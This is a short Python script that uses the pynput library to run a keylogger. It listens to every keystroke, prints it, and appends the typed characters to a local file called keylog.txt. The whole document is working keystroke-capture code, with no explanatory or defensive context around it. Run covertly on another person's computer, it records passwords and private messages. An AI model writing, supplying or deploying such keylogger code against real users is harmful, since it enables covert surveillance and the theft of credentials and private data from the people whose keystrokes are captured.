from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("keylog.txt", "a") as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("error getting character") 

if __name__ == "__main__":
    listeners = keyboard.Listener(on_press=keypressed)
    listeners.start()
    listeners.join()